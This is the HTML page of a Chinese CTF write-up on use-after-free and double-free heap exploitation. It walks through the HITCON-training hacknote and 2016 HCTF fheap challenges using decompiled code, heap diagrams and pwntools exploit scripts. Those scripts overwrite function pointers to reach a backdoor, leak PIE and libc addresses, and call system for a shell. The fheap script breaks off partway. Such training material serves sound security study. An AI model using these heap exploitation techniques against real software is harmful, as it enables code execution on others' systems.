@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="Using-After-Free总之就是free后没有将指针置为null造成的，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Using-After-Free">
+<meta property="og:url" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/index.html">
+<meta property="og:site_name" content="Grxer&#39;s Blog">
+<meta property="og:description" content="Using-After-Free总之就是free后没有将指针置为null造成的，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230304180356251.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230304184036356.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230304184226530.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230304185117164.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230304185427692.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230304190759691.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230304192052112.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230307152831940.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230307163539833.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230307174939515.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230308005837886.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230308011254973.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230308124636807.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230308125210074.png">
+<meta property="article:published_time" content="2023-03-04T09:53:14.000Z">
+<meta property="article:modified_time" content="2023-03-29T16:55:05.717Z">
+<meta property="article:author" content="bxz">
+<meta property="article:tag" content="Double Free">
+<meta property="article:tag" content="Using After Free">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://grxer.gitee.io/2023/03/04/Using-After-Free/image-20230304180356251.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Using-After-Free</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 lrt">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/03/05/sd-police2023-pwn/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/03/02/AsisCTF2016b00ks-OBO/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/04/Using-After-Free/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&text=Using-After-Free"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&title=Using-After-Free"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&is_video=false&description=Using-After-Free"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Using-After-Free&body=Check out this article: https://grxer.gitee.io/2023/03/04/Using-After-Free/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&title=Using-After-Free"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&title=Using-After-Free"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&title=Using-After-Free"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&title=Using-After-Free"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&name=Using-After-Free&description=&lt;h1 id=&#34;Using-After-Free&#34;&gt;&lt;a href=&#34;#Using-After-Free&#34; class=&#34;headerlink&#34; title=&#34;Using-After-Free&#34;&gt;&lt;/a&gt;Using-After-Free&lt;/h1&gt;&lt;p&gt;总之就是free后没有将指针置为null造成的，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/04/Using-After-Free/&t=Using-After-Free"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Using-After-Free"><span class="toc-number">1.</span> <span class="toc-text">Using-After-Free</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON-training-lib10"><span class="toc-number">1.1.</span> <span class="toc-text">HITCON-training lib10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tchche-bin"><span class="toc-number">1.1.1.</span> <span class="toc-text">tchche bin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2016-HCTF-fheap"><span class="toc-number">1.2.</span> <span class="toc-text">2016 HCTF fheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#using-after-free"><span class="toc-number">1.2.1.</span> <span class="toc-text">using after free</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E4%B8%BAcall-puts%EF%BC%8C%E6%B3%84%E9%9C%B2pie%E5%9F%BA%E5%9D%80"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">覆盖为call puts，泄露pie基址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E4%B8%BAprintf%EF%BC%8C%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">覆盖为printf，利用格式化字符串漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E4%B8%BAsystem"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">覆盖为system</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#double-free"><span class="toc-number">1.2.2.</span> <span class="toc-text">double free</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-%E8%BF%99%E9%87%8C%E5%8F%AA%E6%B3%84%E9%9C%B2%E5%92%8C%E5%BE%AA%E7%8E%AF%E5%88%A9%E7%94%A8%EF%BC%8C%E9%85%8D%E5%90%88%E5%89%8D%E9%9D%A2%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%80%9D%E8%B7%AF%E7%9A%84%E4%BB%BB%E4%BD%95%E4%B8%80%E7%A7%8D%E9%83%BD%E5%8F%AF%E4%BB%A5"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">exp 这里只泄露和循环利用，配合前面的两种思路的任何一种都可以</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Using-After-Free
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">bxz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-04T09:53:14.000Z" itemprop="datePublished">2023-03-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Double-Free/" rel="tag">Double Free</a>, <a class="tag-link-link" href="/tags/Using-After-Free/" rel="tag">Using After Free</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Using-After-Free"><a href="#Using-After-Free" class="headerlink" title="Using-After-Free"></a>Using-After-Free</h1><p>总之就是free后没有将指针置为null造成的，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p>
+<span id="more"></span>
+
+<h2 id="HITCON-training-lib10"><a href="#HITCON-training-lib10" class="headerlink" title="HITCON-training lib10"></a>HITCON-training lib10</h2><p>题目链接：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304180356251.png" alt="image-20230304180356251"></p>
+<p>题目可以最多创建5个note,会放在全局变量notelist里(00x804A070)</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> (*put)(<span class="type">void</span>*);</span><br><span class="line">    <span class="type">char</span> *content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>后没有将指针置为<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>print_note里有</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  notelist[v1]-&gt;put(notelist[v1]);</span><br></pre></td></tr></table></figure>
+
+<p>有后门函数magic</p>
+<p>如果我们可以控制notelist[v1]-&gt;put为magic就可以拿到flag</p>
+<p>在 add_note里我们会先malloc note结构体，后面会再申请context的内存，del时会先</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line"><span class="built_in">free</span>(notelist[v1]);</span><br></pre></td></tr></table></figure>
+
+<p>我们先</p>
+<p>addnote(16, b”aaaa”) # add note 0<br>addnote(16, b”ddaa”) # add note 1</p>
+<p>第一次malloc</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304184036356.png" alt="image-20230304184036356"></p>
+<p>第二次</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304184226530.png" alt="image-20230304184226530"></p>
+<p>依次malloc，堆的是这样的</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304185117164.png" alt="image-20230304185117164"></p>
+<p>我们去free</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304185427692.png" alt="image-20230304185427692"></p>
+<h3 id="tchche-bin"><a href="#tchche-bin" class="headerlink" title="tchche bin"></a>tchche bin</h3><p><strong>Tcache</strong>机制是在<strong>libc-2.26</strong>中引入，小于0x400的堆，<strong>FILO</strong>(先进后出)的单循环链表、精确分配(不切割)、<strong>free</strong>后为防止合并后一个堆块的<strong>inuse</strong>位不置<strong>0</strong>，大小低于<strong>0x400</strong>字节的堆块时会首先放入<strong>Tcachebin</strong>，每个bins最多存放7个chunk，malloc在申请大小低于<strong>0x400</strong>的堆块时</p>
+<p>再次申请</p>
+<p>addnote(8, p32(magic))</p>
+<p>这里都需要0x10大小的chunk，刚好有两个</p>
+<p>这样我们修改note3的context内容也就修改了note1的put指针</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304190759691.png" alt="image-20230304190759691"></p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304192052112.png" alt="image-20230304192052112"></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">b&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">b&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="2016-HCTF-fheap"><a href="#2016-HCTF-fheap" class="headerlink" title="2016 HCTF fheap"></a>2016 HCTF fheap</h2><p><a target="_blank" rel="noopener" href="https://github.com/zh-explorer/hctf2016-fheap">https://github.com/zh-explorer/hctf2016-fheap</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; ./pwn-f </span><br><span class="line">+++++++++++++++++++++++++++</span><br><span class="line">So, let&#x27;s crash the world</span><br><span class="line">+++++++++++++++++++++++++++</span><br><span class="line">1.create string</span><br><span class="line">2.delete string</span><br><span class="line">3.quit</span><br><span class="line">^C⏎                                                                                                                                             grxer@grxer ~/D/c/p/heap [SIGINT]&gt; checksec pwn-f </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/pwn-f&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>功能很简单，再create时会malloc一个结构体，string长度&gt;0xf会再次申请一块内存,&lt;直接存在了结构体里，直接推测出结构体大致</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">String</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> *buf;</span><br><span class="line">        <span class="type">char</span> <span class="built_in">array</span>[<span class="number">16</span>];</span><br><span class="line">    &#125; o;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="comment">//这里会填充8字节以满足结构体对齐规则 </span></span><br><span class="line">    <span class="type">void</span> (*<span class="built_in">free</span>)(<span class="keyword">struct</span> String *ptr);</span><br><span class="line">&#125; String;</span><br></pre></td></tr></table></figure>
+
+<p>存在一个结构体数组的全局变量在0x2020C0来存储chunk</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> inuse;</span><br><span class="line">    String *str;</span><br><span class="line">&#125; Strings[<span class="number">0x10</span>]; 大小为<span class="number">16</span>字节</span><br></pre></td></tr></table></figure>
+
+<p>删除时只是简单free没有null 产生dangling pointer</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0x11</span> )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid id&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( *((_QWORD *)&amp;struct_at + <span class="number">2</span> * (<span class="type">int</span>)v1 + <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Are you sure?:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, <span class="string">&quot;yes&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="type">void</span> (__fastcall **)(_QWORD))(*((_QWORD *)&amp;struct_at + <span class="number">2</span> * (<span class="type">int</span>)v1 + <span class="number">1</span>) + <span class="number">24LL</span>))(*((_QWORD *)&amp;struct_at</span><br><span class="line">                                                                                        + <span class="number">2</span> * (<span class="type">int</span>)v1</span><br><span class="line">                                                                                        + <span class="number">1</span>));</span><br><span class="line">    *((_DWORD *)&amp;struct_at + <span class="number">4</span> * (<span class="type">int</span>)v1) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>create(10,’hello’)<br>create(0x20,’grxer666666666666666666666666666’)</p>
+<img src="/2023/03/04/Using-After-Free/image-20230307152831940.png" alt="image-20230307152831940" style="zoom:67%;">
+
+<h3 id="using-after-free"><a href="#using-after-free" class="headerlink" title="using after free"></a>using after free</h3><p>我们先creat 两个string ，这样共申请了2个0x32大小的chunk，再先释放1再释放0会进入tcache bins</p>
+<p><code>tchche bin    string0------&gt;string1</code></p>
+<p>这时候我们在申请一块小于0x28大小的chunk(空间复用会导致比原来可以多8个字节，也就是chunk head的prev size)</p>
+<p>这样我们的结构体会分到string0地址，context会分到string 1地址，string1地址里的free函数还在里面，而且还在全局结构数组里，可以控制该指针为任意函数</p>
+<p>这样我们下次再delete(0)可以把两个chunk再次释放</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_D6C</span><span class="params">(<span class="type">void</span> **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*a1);</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再次申请就又可以和之前一样，再次delete（1）循环利用</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230307163539833.png" alt="image-20230307163539833"></p>
+<h4 id="覆盖为call-puts，泄露pie基址"><a href="#覆盖为call-puts，泄露pie基址" class="headerlink" title="覆盖为call puts，泄露pie基址"></a>覆盖为call puts，泄露pie基址</h4><p>payload&#x3D;b’a’*24+b’\x1a’<br>create(len(payload),payload)</p>
+<h4 id="覆盖为printf，利用格式化字符串漏洞"><a href="#覆盖为printf，利用格式化字符串漏洞" class="headerlink" title="覆盖为printf，利用格式化字符串漏洞"></a>覆盖为printf，利用格式化字符串漏洞</h4><p>利用pie基址，泄露libc即可</p>
+<p>payload&#x3D;b’a’*4+b’%15$p’.ljust(20,b’b’)+p64(printf_plt)<br>create(len(payload),payload)<br>delete(1)<br>ru(b’a’*4)<br>_IO_file_write&#x3D;int(r(14),16)-45<br>p(‘_IO_file_write’,_IO_file_write)</p>
+<h4 id="覆盖为system"><a href="#覆盖为system" class="headerlink" title="覆盖为system"></a>覆盖为system</h4><p>拿到shell</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230307174939515.png" alt="image-20230307174939515"></p>
+<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span 